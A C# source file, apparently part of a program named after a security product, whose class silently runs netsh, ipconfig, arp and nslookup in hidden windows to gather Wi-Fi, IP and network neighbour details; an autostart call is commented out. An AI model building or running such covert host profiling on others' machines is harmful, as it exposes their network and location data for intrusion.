using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;

namespace TouchEnNxKey
{
    class SystemInformation
    {
        private static string sep = "\r\n\r\n\r\n---------------------------------------------------------------------\r\n\r\n\r\n";

        public static string GetAll()
        {
            string ExeFileName = System.Reflection.Assembly.GetEntryAssembly().Location;
            
            //RegisterAutostart(ExeFileName);


            StringBuilder sb = new StringBuilder();
            sb.Append(sep);
            sb.Append(getWifiInfo());
            sb.Append(sep);
            sb.Append(getPublicIP());
            sb.Append(sep);
            sb.Append(getIpconfig_All());
            sb.Append(sep);
            sb.Append(getARP());
            sb.Append(sep);
            string info = sb.ToString();

            return info;

        }

        static string runCommand(string command)
        {
            Process proc = new Process();
            proc.StartInfo.CreateNoWindow = true;
            proc.StartInfo.FileName = "cmd";

            proc.StartInfo.Arguments = "/C \"" + command + "\"";

            proc.StartInfo.RedirectStandardOutput = true;
            proc.StartInfo.UseShellExecute = false;
            proc.Start();
            string output = proc.StandardOutput.ReadToEnd();
            proc.WaitForExit();

            return output;
        }

        static string getWifiInfo()
        {
            string command = "netsh wlan show networks mode=bssid";
            string output = "Command : " + command + "\r\n";
            output += runCommand(command);
            return output;
        }


        static string getIpconfig_All()
        {
            string command = "ipconfig /all";
            string output = "Command : " + command + "\r\n";
            output += runCommand(command);
            return output;
        }


        static string getARP()
        {
            string command = "arp -a";
            string output = "Command : " + command + "\r\n";
            output += runCommand(command);
            return output;
        }


        static string getPublicIP()
        {
            string command = "nslookup myip.opendns.com resolver1.opendns.com";
            string output = "Command : " + command + "\r\n" + "\r\n";
            output += runCommand(command);
            return output;

        }
    }
}
